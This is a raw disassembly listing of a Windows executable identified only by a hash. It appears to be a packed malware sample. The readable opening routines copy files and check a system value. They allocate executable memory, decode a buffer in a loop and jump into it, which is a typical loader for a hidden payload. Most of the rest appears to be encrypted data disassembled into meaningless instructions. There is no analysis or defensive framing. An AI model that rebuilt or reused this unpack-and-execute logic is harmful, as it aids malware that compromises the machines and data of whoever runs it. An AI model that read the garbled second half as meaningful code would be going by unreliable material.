
7fbba6daa1e4d5473d9ebad35aa89102935ceb2f7ed4106043c92289c0444f34.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	sub    esp,0xf8
  411006:	push   esi
  411007:	mov    esi,DWORD PTR ds:0x42901c
  41100d:	push   edi
  41100e:	push   0x0
  411010:	push   0x80
  411015:	push   0x3
  411017:	push   0x0
  411019:	push   0x0
  41101b:	push   0x80000000
  411020:	push   0x4291e8
  411025:	call   esi
  411027:	mov    edi,eax
  411029:	cmp    edi,0xffffffff
  41102c:	mov    DWORD PTR [esp+0xc],edi
  411030:	je     0x41115f
  411036:	push   0x0
  411038:	push   0x80
  41103d:	push   0x4
  41103f:	push   0x0
  411041:	push   0x1
  411043:	push   0x4
  411045:	push   0x4291e0
  41104a:	call   esi
  41104c:	mov    esi,eax
  41104e:	cmp    esi,0xffffffff
  411051:	jne    0x411061
  411053:	pop    edi
  411054:	mov    eax,0x1
  411059:	pop    esi
  41105a:	add    esp,0xf8
  411060:	ret    
  411061:	push   ebx
  411062:	mov    ebx,DWORD PTR ds:0x429018
  411068:	push   ebp
  411069:	mov    ebp,DWORD PTR ds:0x429014
  41106f:	nop
  411070:	push   0x0
  411072:	lea    eax,[esp+0x14]
  411076:	push   eax
  411077:	push   0xc8
  41107c:	lea    ecx,[esp+0x4c]
  411080:	push   ecx
  411081:	push   edi
  411082:	call   DWORD PTR ds:0x429010
  411088:	test   eax,eax
  41108a:	je     0x4110d1
  41108c:	push   0x2
  41108e:	push   0x0
  411090:	push   0x0
  411092:	push   esi
  411093:	call   ebx
  411095:	mov    edx,DWORD PTR [esp+0x10]
  411099:	push   0x0
  41109b:	push   edx
  41109c:	push   0x0
  41109e:	mov    edi,eax
  4110a0:	push   edi
  4110a1:	push   esi
  4110a2:	call   ebp
  4110a4:	mov    ecx,DWORD PTR [esp+0x10]
  4110a8:	push   0x0
  4110aa:	lea    eax,[esp+0x1c]
  4110ae:	push   eax
  4110af:	push   ecx
  4110b0:	lea    edx,[esp+0x4c]
  4110b4:	push   edx
  4110b5:	push   esi
  4110b6:	call   DWORD PTR ds:0x42902c
  4110bc:	mov    eax,DWORD PTR [esp+0x10]
  4110c0:	push   0x0
  4110c2:	push   eax
  4110c3:	push   0x0
  4110c5:	push   edi
  4110c6:	push   esi
  4110c7:	call   DWORD PTR ds:0x429040
  4110cd:	mov    edi,DWORD PTR [esp+0x14]
  4110d1:	cmp    DWORD PTR [esp+0x10],0xc8
  4110d9:	je     0x411070
  4110db:	push   edi
  4110dc:	mov    edi,DWORD PTR ds:0x429044
  4110e2:	call   edi
  4110e4:	push   esi
  4110e5:	call   edi
  4110e7:	lea    ecx,[esp+0x1c]
  4110eb:	push   ecx
  4110ec:	call   DWORD PTR ds:0x42904c
  4110f2:	mov    ecx,DWORD PTR [esp+0x38]
  4110f6:	xor    edx,edx
  4110f8:	mov    eax,0x21c00
  4110fd:	div    ecx
  4110ff:	mov    edi,DWORD PTR ds:0x42911c
  411105:	lea    edx,[esp+0x40]
  411109:	mov    ebx,ecx
  41110b:	mov    esi,eax
  41110d:	imul   esi,ecx
  411110:	push   esi
  411111:	push   0x4291a8
  411116:	push   edx
  411117:	call   edi
  411119:	xor    edx,edx
  41111b:	mov    eax,0x21c00
  411120:	div    ebx
  411122:	lea    eax,[esp+0x4c]
  411126:	add    edx,0x400
  41112c:	push   edx
  41112d:	push   0x429180
  411132:	push   eax
  411133:	call   edi
  411135:	push   0x22000
  41113a:	lea    ecx,[esp+0x5c]
  41113e:	push   0x429150
  411143:	push   ecx
  411144:	call   edi
  411146:	mov    edx,0x21c00
  41114b:	sub    edx,esi
  41114d:	push   edx
  41114e:	lea    eax,[esp+0x68]
  411152:	push   0x429128
  411157:	push   eax
  411158:	call   edi
  41115a:	add    esp,0x30
  41115d:	pop    ebp
  41115e:	pop    ebx
  41115f:	pop    edi
  411160:	xor    eax,eax
  411162:	pop    esi
  411163:	add    esp,0xf8
  411169:	ret    
  41116a:	nop
  41116b:	nop
  41116c:	nop
  41116d:	nop
  41116e:	nop
  41116f:	nop
  411170:	sub    esp,0x8
  411173:	push   ebx
  411174:	push   ebp
  411175:	mov    ebp,DWORD PTR [esp+0x20]
  411179:	push   esi
  41117a:	xor    eax,eax
  41117c:	push   edi
  41117d:	mov    edi,DWORD PTR [esp+0x1c]
  411181:	mov    DWORD PTR [esp+0x10],eax
  411185:	mov    esi,0xfffffffd
  41118a:	mov    DWORD PTR [esp+0x14],0x1
  411192:	mov    ecx,DWORD PTR [esp+0x20]
  411196:	mov    cl,BYTE PTR [ecx+esi*1+0x3]
  41119a:	add    esi,0x2
  41119d:	inc    esi
  41119e:	mov    BYTE PTR [esi+edi*1],cl
  4111a1:	movzx  edx,BYTE PTR [eax+ebp*1]
  4111a5:	mov    eax,DWORD PTR [esp+0x10]
  4111a9:	mov    ecx,DWORD PTR [esp+0x14]
  4111ad:	add    eax,ecx
  4111af:	mov    DWORD PTR [esp+0x10],eax
  4111b3:	shr    eax,cl
  4111b5:	mov    eax,DWORD PTR [esp+0x10]
  4111b9:	mov    ecx,eax
  4111bb:	shr    ecx,0x3
  4111be:	mov    ebx,0x1
  4111c3:	sub    ebx,ecx
  4111c5:	imul   eax,ebx
  4111c8:	mov    DWORD PTR [esp+0x10],eax
  4111cc:	shl    ebx,0x3
  4111cf:	mov    bl,BYTE PTR [esi+edi*1]
  4111d2:	mov    ecx,DWORD PTR [esp+0x24]
  4111d6:	add    bl,dl
  4111d8:	mov    BYTE PTR [esi+edi*1],bl
  4111db:	sub    esi,0x2
  4111de:	cmp    esi,ecx
  4111e0:	jl     0x411192
  4111e2:	pop    edi
  4111e3:	pop    esi
  4111e4:	pop    ebp
  4111e5:	pop    ebx
  4111e6:	add    esp,0x8
  4111e9:	ret    
  4111ea:	nop
  4111eb:	nop
  4111ec:	nop
  4111ed:	nop
  4111ee:	nop
  4111ef:	nop
  4111f0:	push   ebp
  4111f1:	mov    ebp,esp
  4111f3:	sub    esp,0x70
  4111f6:	mov    DWORD PTR [ebp-0x48],0x0
  4111fd:	mov    DWORD PTR [ebp-0x18],0x0
  411204:	mov    DWORD PTR [ebp-0x70],0x0
  41120b:	mov    DWORD PTR [ebp-0x60],0x0
  411212:	mov    DWORD PTR [ebp-0x8],0x0
  411219:	mov    DWORD PTR [ebp-0x6c],0x0
  411220:	mov    DWORD PTR [ebp-0x68],0x0
  411227:	mov    DWORD PTR [ebp-0x14],0x0
  41122e:	mov    DWORD PTR [ebp-0x4c],0x0
  411235:	mov    DWORD PTR [ebp-0x10],0x0
  41123c:	mov    DWORD PTR [ebp-0x58],0x0
  411243:	mov    DWORD PTR [ebp-0x4],0x0
  41124a:	mov    DWORD PTR [ebp-0x5c],0x0
  411251:	mov    DWORD PTR [ebp-0x30],0x0
  411258:	mov    DWORD PTR [ebp-0x54],0x0
  41125f:	mov    DWORD PTR [ebp-0x2c],0x0
  411266:	mov    DWORD PTR [ebp-0x50],0x0
  41126d:	mov    DWORD PTR [ebp-0xc],0x0
  411274:	mov    eax,ds:0x429214
  411279:	mov    DWORD PTR [ebp-0x28],eax
  41127c:	mov    ecx,DWORD PTR ds:0x429218
  411282:	mov    DWORD PTR [ebp-0x24],ecx
  411285:	mov    edx,DWORD PTR ds:0x42921c
  41128b:	mov    DWORD PTR [ebp-0x20],edx
  41128e:	mov    al,ds:0x429220
  411293:	mov    BYTE PTR [ebp-0x1c],al
  411296:	mov    ecx,DWORD PTR ds:0x429204
  41129c:	mov    DWORD PTR [ebp-0x40],ecx
  41129f:	mov    edx,DWORD PTR ds:0x429208
  4112a5:	mov    DWORD PTR [ebp-0x3c],edx
  4112a8:	mov    eax,ds:0x42920c
  4112ad:	mov    DWORD PTR [ebp-0x38],eax
  4112b0:	mov    cx,WORD PTR ds:0x429210
  4112b7:	mov    WORD PTR [ebp-0x34],cx
  4112bb:	mov    dl,BYTE PTR ds:0x429212
  4112c1:	mov    BYTE PTR [ebp-0x32],dl
  4112c4:	mov    DWORD PTR [ebp-0x30],0x40
  4112cb:	lea    eax,[ebp-0x10]
  4112ce:	push   eax
  4112cf:	push   0x4291f0
  4112d4:	call   DWORD PTR ds:0x429008
  4112da:	test   eax,eax
  4112dc:	je     0x411338
  4112de:	lea    ecx,[ebp-0x40]
  4112e1:	push   ecx
  4112e2:	lea    edx,[ebp-0x10]
  4112e5:	push   edx
  4112e6:	call   DWORD PTR ds:0x429000
  4112ec:	test   eax,eax
  4112ee:	je     0x411338
  4112f0:	push   0x0
  4112f2:	push   0x0
  4112f4:	push   0x0
  4112f6:	call   DWORD PTR ds:0x429034
  4112fc:	mov    DWORD PTR [ebp-0x14],eax
  4112ff:	mov    eax,DWORD PTR [ebp-0x10]
  411302:	add    eax,0x1
  411305:	mov    DWORD PTR [ebp-0x10],eax
  411308:	push   0x14
  41130a:	push   0x0
  41130c:	mov    ecx,DWORD PTR [ebp-0x14]
  41130f:	push   ecx
  411310:	call   DWORD PTR ds:0x429030
  411316:	lea    edx,[ebp-0x50]
  411319:	push   edx
  41131a:	push   0x0
  41131c:	push   0x0
  41131e:	push   0x0
  411320:	mov    eax,DWORD PTR [ebp-0x50]
  411323:	push   eax
  411324:	call   DWORD PTR ds:0x429004
  41132a:	push   0x0
  41132c:	push   0x0
  41132e:	mov    ecx,DWORD PTR [ebp-0x14]
  411331:	push   ecx
  411332:	call   DWORD PTR ds:0x429048
  411338:	call   DWORD PTR ds:0x429028
  41133e:	mov    DWORD PTR [ebp-0x2c],eax
  411341:	movzx  edx,WORD PTR [ebp-0x2c]
  411345:	cmp    edx,0x539
  41134b:	jne    0x41137c
  41134d:	mov    DWORD PTR [ebp-0x14],0xe0d
  411354:	lea    eax,[ebp-0x28]
  411357:	push   eax
  411358:	call   DWORD PTR ds:0x429024
  41135e:	mov    DWORD PTR [ebp-0x60],eax
  411361:	mov    DWORD PTR [ebp-0x54],0x3a
  411368:	mov    BYTE PTR [ebp-0x34],0x0
  41136c:	mov    DWORD PTR [ebp-0x8],0x36719812
  411373:	mov    DWORD PTR [ebp-0x68],0x10d93f
  41137a:	jmp    0x411391
  41137c:	mov    BYTE PTR ds:0x444a58,0x0
  411383:	mov    BYTE PTR ds:0x42cb88,0x0
  41138a:	mov    BYTE PTR ds:0x442b18,0x0
  411391:	mov    DWORD PTR [ebp-0x2c],0x410000
  411398:	push   DWORD PTR ds:0x429024
  41139e:	pop    edx
  41139f:	mov    DWORD PTR [ebp-0x6c],edx
  4113a2:	lea    ecx,[ebp-0x40]
  4113a5:	push   ecx
  4113a6:	mov    edx,DWORD PTR [ebp-0x60]
  4113a9:	push   edx
  4113aa:	call   DWORD PTR ds:0x429020
  4113b0:	mov    DWORD PTR [ebp-0x44],eax
  4113b3:	push   DWORD PTR [ebp-0x30]
  4113b6:	push   0x1000
  4113bb:	mov    eax,DWORD PTR [ebp-0x14]
  4113be:	add    eax,0x23
  4113c1:	add    eax,0x23
  4113c4:	push   eax
  4113c5:	xor    eax,eax
  4113c7:	push   eax
  4113c8:	mov    ecx,DWORD PTR [ebp-0x44]
  4113cb:	call   ecx
  4113cd:	push   eax
  4113ce:	pop    ecx
  4113cf:	mov    DWORD PTR [ebp-0x4],ecx
  4113d2:	mov    eax,DWORD PTR [ebp-0x68]
  4113d5:	sub    eax,0xdae0b
  4113da:	mov    DWORD PTR [ebp-0x68],eax
  4113dd:	cmp    DWORD PTR [ebp-0x4],0x0
  4113e1:	jne    0x4113ea
  4113e3:	mov    BYTE PTR ds:0x442b18,0x0
  4113ea:	mov    ecx,DWORD PTR [ebp-0x4]
  4113ed:	add    ecx,DWORD PTR [ebp-0x14]
  4113f0:	mov    edx,DWORD PTR [ebp-0x8]
  4113f3:	mov    DWORD PTR [ecx],edx
  4113f5:	mov    eax,DWORD PTR [ebp-0x4]
  4113f8:	add    eax,DWORD PTR [ebp-0x54]
  4113fb:	mov    DWORD PTR [ebp-0x5c],eax
  4113fe:	mov    ecx,DWORD PTR ds:0x429020
  411404:	mov    DWORD PTR [ebp-0x4c],ecx
  411407:	mov    edx,DWORD PTR [ebp-0x4]
  41140a:	add    edx,DWORD PTR [ebp-0x14]
  41140d:	mov    eax,DWORD PTR [ebp+0x8]
  411410:	mov    DWORD PTR [edx+0x4],eax
  411413:	mov    ecx,DWORD PTR [ebp-0x4]
  411416:	add    ecx,DWORD PTR [ebp-0x14]
  411419:	mov    DWORD PTR [ebp-0xc],ecx
  41141c:	cmp    DWORD PTR [ebp-0x68],0x0
  411420:	jbe    0x41143d
  411422:	mov    edx,DWORD PTR [ebp-0xc]
  411425:	push   edx
  411426:	mov    eax,DWORD PTR [ebp-0x14]
  411429:	push   eax
  41142a:	mov    ecx,DWORD PTR [ebp-0x2c]
  41142d:	add    ecx,DWORD PTR [ebp-0x68]
  411430:	push   ecx
  411431:	mov    edx,DWORD PTR [ebp-0x4]
  411434:	push   edx
  411435:	call   0x411170
  41143a:	add    esp,0x10
  41143d:	cmp    DWORD PTR [ebp-0x5c],0x0
  411441:	je     0x411454
  411443:	push   DWORD PTR [ebp-0x4c]
  411446:	push   DWORD PTR [ebp-0x6c]
  411449:	mov    edx,DWORD PTR [ebp-0x5c]
  41144c:	push   eax
  41144d:	jmp    edx
  41144f:	jmp    0x422f29
  411454:	mov    eax,DWORD PTR [ebp+0x8]
  411457:	mov    DWORD PTR [ebp-0x18],eax
  41145a:	mov    ds:0x90cd53e0,eax
  41145f:	mov    al,ds:0xe87b794f
  411464:	xchg   ebp,eax
  411465:	stc    
  411466:	shl    BYTE PTR [eax+ebp*1],0x5a
  41146a:	ss rcr edx,0xb7
  41146e:	loop   0x4114c1
  411470:	loop   0x4114e7
  411472:	repnz inc ebp
  411474:	mov    edi,0x39b9806e
  411479:	sbb    ebp,DWORD PTR [edx-0xeb8d6de]
  41147f:	arpl   WORD PTR [edx+0x1aa91f60],di
  411485:	cmp    eax,0x5625cd4c
  41148a:	aaa    
  41148b:	fcom   DWORD PTR [ecx-0x1dbd6b20]
  411491:	push   ebp
  411492:	aas    
  411493:	mov    edx,0xd6f79714
  411498:	out    dx,al
  411499:	pcmpgtw mm3,QWORD PTR [edx+eax*4+0x5dce6db3]
  4114a1:	mov    edx,DWORD PTR [ebp-0x1d072b57]
  4114a7:	lahf   
  4114a8:	or     dl,ch
  4114aa:	loopne 0x411437
  4114ac:	xor    BYTE PTR [ebx+0x1a],dl
  4114af:	and    eax,0xf741be3
  4114b4:	dec    ecx
  4114b5:	mov    edi,0x7fd63b2a
  4114ba:	and    eax,0x39a93503
  4114bf:	repnz mov cl,0x1f
  4114c2:	xor    esi,DWORD PTR [edi+0x64f2810b]
  4114c8:	jns    0x41152c
  4114ca:	mov    cl,0x3c
  4114cc:	jae    0x4114da
  4114ce:	je     0x4114d9
  4114d0:	(bad)  
  4114d1:	mul    BYTE PTR [ebx]
  4114d3:	mov    al,0xf3
  4114d5:	test   BYTE PTR [esi+0x15],bh
  4114d8:	int    0xb9
  4114da:	call   0xe787411e
  4114df:	bound  edi,QWORD PTR [edi]
  4114e1:	cmp    BYTE PTR [ecx+0x2418311a],bh
  4114e7:	(bad)  
  4114e9:	clc    
  4114ea:	pop    ss
  4114eb:	inc    ebx
  4114ec:	cwde   
  4114ed:	sub    al,0xa8
  4114ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4114f0:	jb     0x41155d
  4114f2:	jle    0x411478
  4114f4:	ss pop eax
  4114f6:	pop    ebx
  4114f7:	cs inc ebp
  4114f9:	jl     0x411511
  4114fb:	push   0xf9b1e49e
  411500:	(bad)  
  411501:	loopne 0x4114a4
  411503:	ss sar eax,0x27
  411507:	dec    esp
  411508:	dec    ebp
  411509:	cli    
  41150a:	int3   
  41150b:	pop    esi
  41150c:	or     BYTE PTR [eax+0x25852fb8],ch
  411512:	test   eax,0xc1d1eca1
  411517:	cmp    edx,DWORD PTR [ebp-0x3d737ebc]
  41151d:	clc    
  41151e:	test   eax,0x74674c6b
  411523:	lods   al,BYTE PTR ds:[esi]
  411524:	sar    eax,cl
  411526:	in     al,0x10
  411528:	cmp    eax,0x8397d213
  41152d:	add    BYTE PTR [ebx+0xb11121f],ch
  411533:	(bad)  
  411534:	mov    ds:0x646e5a6a,al
  411539:	xchg   ebx,eax
  41153a:	sub    eax,0xc90ae1d7
  41153f:	sub    DWORD PTR [edi+0x607a895b],edx
  411545:	jecxz  0x411555
  411547:	dec    edi
  411548:	or     DWORD PTR [edi],edx
  41154a:	leave  
  41154b:	mul    BYTE PTR ds:0x519d8c05
  411551:	dec    edi
  411552:	cmp    DWORD PTR [ebx+0x2d],esi
  411555:	loopne 0x411566
  411557:	pop    ss
  411558:	in     eax,0xad
  41155a:	pop    esi
  41155b:	push   ebp
  41155c:	loope  0x41151b
  41155e:	(bad)  
  41155f:	pop    eax
  411560:	(bad)  [ebx+0x38]
  411563:	int    0xed
  411565:	jle    0x411585
  411567:	es cld 
  411569:	sub    DWORD PTR [eax+0x7],ebx
  41156c:	push   esp
  41156d:	lods   eax,DWORD PTR ds:[esi]
  41156e:	adc    bh,ch
  411570:	xchg   ebx,eax
  411571:	xor    eax,0x13322029
  411576:	push   0xbca4c350
  41157b:	xchg   ebp,edx
  41157d:	mov    cl,0x59
  41157f:	imul   edx,DWORD PTR [edi-0x1faeea31],0xffffffd9
  411586:	push   ebp
  411587:	nop
  411588:	or     al,0xc0
  41158a:	sub    eax,0x905a9622
  41158f:	dec    eax
  411590:	outs   dx,BYTE PTR ds:[esi]
  411591:	push   ds
  411592:	dec    ebx
  411593:	sti    
  411594:	(bad)  [esi-0x7e]
  411597:	xor    BYTE PTR [edx+0x2432a5e0],cl
  41159d:	dec    esp
  41159e:	retf   0x73d
  4115a1:	push   ss
  4115a2:	nop
  4115a3:	adc    ecx,DWORD PTR [edx-0x1d]
  4115a6:	inc    esp
  4115a7:	inc    ebp
  4115a8:	(bad)  
  4115aa:	iret   
  4115ab:	arpl   WORD PTR [ebx],si
  4115ad:	xchg   ebp,eax
  4115ae:	xor    DWORD PTR ds:0x14c4c512,edi
  4115b4:	das    
  4115b5:	add    DWORD PTR [esi+0x6b3e40c0],edx
  4115bb:	daa    
  4115bc:	jo     0x41160b
  4115be:	ror    DWORD PTR [ebx-0x4b],0x72
  4115c2:	adc    edx,DWORD PTR [edi+0x6284c544]
  4115c8:	lods   eax,DWORD PTR ds:[esi]
  4115c9:	inc    edx
  4115ca:	push   ss
  4115cb:	mov    edi,0x3b155935
  4115d0:	jg     0x4115c3
  4115d2:	mov    esi,0x4fbd26d0
  4115d7:	gs pop ds
  4115d9:	rcl    DWORD PTR [edx],0x4a
  4115dc:	in     eax,dx
  4115dd:	push   edx
  4115de:	call   DWORD PTR [ebx-0x4d]
  4115e1:	sub    al,0x2b
  4115e3:	mov    ecx,0x4a0080cc
  4115e8:	daa    
  4115e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115ea:	outs   dx,DWORD PTR ds:[esi]
  4115eb:	add    al,0xbe
  4115ed:	clc    
  4115ee:	dec    edx
  4115ef:	sbb    eax,0xab1354d4
  4115f4:	jg     0x41164a
  4115f6:	call   0x7f1a:0xe0ba614b
  4115fd:	call   0x65ab0ff7
  411602:	cmp    esi,DWORD PTR [esi+0x6d6b5cf6]
  411608:	xor    DWORD PTR [edx],edi
  41160a:	push   edx
  41160b:	div    BYTE PTR [esi+esi*2-0x52e54c50]
  411612:	adc    DWORD PTR [edx+0x61859b0b],esp
  411618:	ss lahf 
  41161a:	out    dx,al
  41161b:	pusha  
  41161c:	data16 jnp 0x4115f0
  41161f:	push   esi
  411620:	rep outs dx,BYTE PTR ds:[esi]
  411622:	popf   
  411623:	adc    esi,DWORD PTR [ebp+ecx*4+0x468dcef1]
  41162a:	dec    esi
  41162b:	mov    eax,ds:0x797014dc
  411630:	dec    edx
  411631:	lds    esi,FWORD PTR [edx+0x6]
  411634:	push   ebp
  411635:	call   0x36a4:0xb882e388
  41163c:	stos   BYTE PTR es:[edi],al
  41163d:	jbe    0x411674
  41163f:	(bad)  
  411640:	cmc    
  411641:	push   esi
  411642:	jae    0x411633
  411644:	push   0xffffffc0
  411646:	add    al,dl
  411648:	mov    dl,0x56
  41164a:	mov    ebx,ebp
  41164c:	popa   
  41164d:	in     eax,dx
  41164e:	ins    BYTE PTR es:[edi],dx
  41164f:	fild   DWORD PTR [eax-0x17]
  411652:	dec    ebx
  411653:	dec    edi
  411654:	xchg   ebx,eax
  411655:	ja     0x41169a
  411657:	pushf  
  411658:	pop    ds
  411659:	ins    BYTE PTR es:[edi],dx
  41165a:	leave  
  41165b:	repnz xor al,cl
  41165e:	cmp    eax,0x2ed9fc31
  411663:	icebp  
  411664:	adc    ebx,DWORD PTR [edi-0x782e5b9b]
  41166a:	mov    eax,ds:0x2311c1f6
  41166f:	sbb    al,0x3d
  411671:	shl    dl,1
  411673:	arpl   di,si
  411675:	dec    esi
  411676:	enter  0x85be,0x2f
  41167a:	push   edx
  41167b:	pusha  
  41167c:	xor    ebx,DWORD PTR [esi+0x5133e595]
  411682:	lods   eax,DWORD PTR ds:[esi]
  411683:	or     al,0x8e
  411685:	jae    0x411686
  411687:	adc    DWORD PTR [eax+0x68c838ab],ecx
  41168d:	xlat   BYTE PTR ds:[ebx]
  41168e:	jne    0x411651
  411690:	add    eax,0xda0b1cd6
  411695:	inc    ebp
  411696:	std    
  411697:	pop    eax
  411698:	and    BYTE PTR [ecx+0x74],0xc7
  41169c:	mov    cx,0xb1bb
  4116a0:	clc    
  4116a1:	jb     0x411716
  4116a3:	sbb    DWORD PTR es:[edi-0x57],esi
  4116a7:	mov    edi,0xe32cc937
  4116ac:	push   ecx
  4116ad:	in     eax,dx
  4116ae:	stc    
  4116af:	or     eax,0xdbb453d1
  4116b4:	ret    0xbcd1
  4116b7:	jmp    0x508c589a
  4116bc:	or     eax,0xf0c2010
  4116c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116c2:	push   cs
  4116c3:	dec    ebp
  4116c4:	mov    BYTE PTR [edx],dl
  4116c6:	out    dx,eax
  4116c7:	(bad)  
  4116c8:	je     0x41169a
  4116ca:	pop    ss
  4116cb:	ss into 
  4116cd:	fdivr  DWORD PTR [ebx+0x2b]
  4116d0:	add    BYTE PTR [ebp+0x6635f523],0xbb
  4116d7:	lods   al,BYTE PTR ds:[esi]
  4116d8:	mov    ecx,0x76e16b1c
  4116dd:	xchg   esp,eax
  4116de:	test   DWORD PTR [ecx+0x50],0xc8875016
  4116e5:	or     BYTE PTR [ebx],0x14
  4116e8:	adc    ecx,edi
  4116ea:	xor    DWORD PTR [ebx+eiz*4],eax
  4116ed:	adc    eax,DWORD PTR [edi]
  4116ef:	int    0x4e
  4116f1:	neg    DWORD PTR [esi+0x77c901dd]
  4116f7:	mov    ds:0xbc51c139,eax
  4116fc:	pop    es
  4116fd:	cmp    edi,eax
  4116ff:	adc    edx,DWORD PTR ds:0x7840681f
  411705:	(bad)  
  411706:	jp     0x4116dc
  411708:	(bad)  
  411709:	fsubr  QWORD PTR [edi+0x24]
  41170c:	sbb    edi,DWORD PTR [ecx-0x5d]
  41170f:	add    ch,BYTE PTR [ebp+0x4951ff41]
  411715:	lahf   
  411716:	ja     0x41175a
  411718:	mov    ah,BYTE PTR [edx+0x1193bcb4]
  41171e:	sti    
  41171f:	and    dl,cl
  411721:	or     cl,BYTE PTR [ebx]
  411723:	or     DWORD PTR [ecx-0x605419ca],0x57
  41172a:	outs   dx,BYTE PTR ds:[esi]
  41172b:	popa   
  41172c:	bound  esp,QWORD PTR [esi-0x35]
  41172f:	stc    
  411730:	fadd   st,st(0)
  411732:	inc    edi
  411733:	dec    esp
  411734:	xor    eax,0x511690d6
  411739:	sub    DWORD PTR [edi+0x68],edi
  41173c:	(bad)  
  41173d:	sbb    al,BYTE PTR [edi+0x5f39c62]
  411743:	push   cs
  411744:	jb     0x4116f2
  411746:	jnp    0x4117c4
  411748:	xchg   edi,eax
  411749:	mov    esp,0x871ab4f8
  41174e:	fld    st(6)
  411750:	mov    eax,0xe5746986
  411755:	outs   dx,DWORD PTR ds:[esi]
  411756:	icebp  
  411757:	ss out dx,eax
  411759:	in     eax,dx
  41175a:	hlt    
  41175b:	mov    ebp,0x1b87d568
  411760:	adc    DWORD PTR [ebp+0x72],esp
  411763:	neg    DWORD PTR [ecx-0x4]
  411766:	push   edi
  411767:	sahf   
  411768:	hlt    
  411769:	and    ecx,ebx
  41176b:	pop    ds
  41176c:	call   0xf12f0faa
  411771:	mov    ch,0x40
  411773:	mov    bl,0xbe
  411775:	sbb    cl,BYTE PTR [edx-0x15b8ec04]
  41177b:	mov    fs,esi
  41177d:	cdq    
  41177e:	add    esi,DWORD PTR [ebp-0x6d]
  411781:	pop    esi
  411782:	(bad)  
  411783:	(bad)  
  411784:	mov    eax,0xd30bf65a
  411789:	and    bl,BYTE PTR [edx]
  41178b:	sar    BYTE PTR [edx],0xf1
  41178e:	mov    al,ds:0x8d6f08c7
  411794:	popa   
  411795:	add    DWORD PTR [eax-0x75],edx
  411798:	adc    eax,0xe21a712c
  41179d:	and    esi,edx
  41179f:	jbe    0x4117d5
  4117a1:	call   0xa983:0xe7ec1772
  4117a8:	or     al,0x45
  4117aa:	jecxz  0x411734
  4117ac:	test   eax,0xc8756373
  4117b1:	out    0x1b,eax
  4117b3:	cld    
  4117b4:	mov    ebp,0x7b30b047
  4117b9:	icebp  
  4117ba:	retf   
  4117bb:	push   ecx
  4117bc:	sar    BYTE PTR [ecx-0x7c68febc],0x38
  4117c3:	iret   
  4117c4:	cs ja  0x411798
  4117c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117c8:	pop    esp
  4117c9:	std    
  4117ca:	dec    ebx
  4117cb:	es out dx,eax
  4117cd:	dec    ecx
  4117ce:	jmp    0x4626:0xba310462
  4117d5:	or     ebx,DWORD PTR [edx]
  4117d7:	sbb    bh,dh
  4117d9:	test   dl,dh
  4117db:	jmp    0x4d232b1b
  4117e0:	push   edx
  4117e1:	(bad)  
  4117e3:	dec    edi
  4117e4:	xor    BYTE PTR [eax+ebx*2+0x37],cl
  4117e8:	sti    
  4117e9:	cli    
  4117ea:	les    ebx,FWORD PTR [edi+0x2a]
  4117ed:	inc    ecx
  4117ee:	cmovbe ecx,DWORD PTR [edx]
  4117f1:	mov    ah,0x7f
  4117f3:	mov    ecx,0xca0bdf1d
  4117f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117f9:	loopne 0x4117aa
  4117fb:	add    BYTE PTR [ebx+edx*8],ah
  4117fe:	dec    ecx
  4117ff:	loop   0x411782
  411801:	mov    eax,ds:0xf65ee515
  411806:	xchg   edx,eax
  411807:	inc    esi
  411808:	cmp    al,BYTE PTR [ecx+ebx*8+0x28]
  41180c:	mov    ah,0xa0
  41180e:	call   0xd85a:0x447f215c
  411815:	xchg   BYTE PTR [ecx+0x2e],dh
  411818:	push   edi
  411819:	and    al,0xcf
  41181b:	xor    al,0xd3
  41181d:	pop    edi
  41181e:	test   al,0xdb
  411820:	mov    al,ds:0x1bb3bfe7
  411825:	stos   DWORD PTR es:[edi],eax
  411826:	xor    eax,0xe7c118fd
  41182b:	in     al,0x33
  41182d:	leave  
  41182e:	mov    es,ebx
  411830:	add    DWORD PTR [eax-0xfcf5fc1],ecx
  411836:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411837:	ret    
  411838:	mov    edx,eax
  41183a:	sub    al,0x27
  41183c:	cmp    al,0xf8
  41183e:	out    0xd8,eax
  411840:	dec    edi
  411841:	mov    DWORD PTR [ebp-0xa0e6e6d],ebp
  411847:	sub    edx,DWORD PTR [ebp+0x57]
  41184a:	int3   
  41184b:	mov    dh,al
  41184d:	or     cl,BYTE PTR [ecx]
  41184f:	and    bh,BYTE PTR [ecx+edi*8-0x69]
  411853:	sbb    al,0xd9
  411855:	(bad)  
  411856:	scas   al,BYTE PTR es:[edi]
  411857:	call   0xfbbd:0x4f45bcbc
  41185e:	inc    edi
  41185f:	jecxz  0x411884
  411861:	xchg   edx,eax
  411862:	or     DWORD PTR [ecx],esi
  411864:	test   DWORD PTR [eax],ebx
  411866:	mov    eax,0x2e184b95
  41186b:	jns    0x41188b
  41186d:	push   cs
  41186e:	fst    DWORD PTR ds:0x6e519f8b
  411874:	std    
  411875:	jl     0x41184f
  411877:	mov    cl,0x3a
  411879:	lods   al,BYTE PTR ds:[esi]
  41187a:	jmp    0xa825c862
  41187f:	into   
  411880:	test   bh,dh
  411882:	packsswb mm4,QWORD PTR [edi+ebp*2-0x461d8cbe]
  41188a:	fsubrp st(6),st
  41188c:	jecxz  0x411826
  41188e:	push   0x1b328fc
  411893:	mov    esi,0xf3a25811
  411898:	aam    0x15
  41189a:	fsub   DWORD PTR [edi]
  41189c:	and    BYTE PTR [ebx-0x3b],cl
  41189f:	ins    DWORD PTR es:[edi],dx
  4118a0:	jbe    0x4118b5
  4118a2:	lock sbb DWORD PTR [edx+ebx*1],edx
  4118a6:	mov    eax,ds:0x70aa6fb2
  4118ab:	inc    eax
  4118ac:	fld    QWORD PTR [esi]
  4118ae:	test   DWORD PTR [esp+esi*1+0x3b],esi
  4118b2:	and    eax,0x1643ca6a
  4118b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118b8:	shr    edi,0x87
  4118bb:	retf   0xb618
  4118be:	hlt    
  4118bf:	cmp    BYTE PTR [eax+edx*2-0x71801151],ch
  4118c6:	push   edi
  4118c7:	neg    BYTE PTR [eax-0x4d376c20]
  4118cd:	arpl   dx,sp
  4118cf:	mov    eax,ds:0x7d3f29ef
  4118d4:	pusha  
  4118d5:	cld    
  4118d6:	loope  0x411948
